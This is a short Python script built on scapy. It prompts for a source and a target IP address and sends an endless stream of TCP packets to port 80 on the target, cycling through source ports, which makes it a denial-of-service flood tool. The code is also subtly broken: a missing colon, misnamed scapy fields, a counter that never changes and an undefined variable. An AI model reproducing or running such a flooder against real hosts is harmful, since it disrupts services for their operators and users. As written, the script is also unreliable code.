from scapy.all import *
source_IP = input("Enter the IP address of source machine: ")
target_IP = input("Enter IP address of target machine: ")

counter = 1

# infinite loop to keep sending packets
while True:
	# this loop will create packet with ports starting from 1 - 65530
	for source_port in range (1, 65530)
		ipInformation = IP(source_IP = source_IP, destination = target_IP)
		TCPInformation = TCP(srcport = source_port, dstport = 80)
		packet = ipInformation / TCPInformation
		send(packet, inter = 0.001)

	print("No of packets sent: ", counter)
	i = i + 1

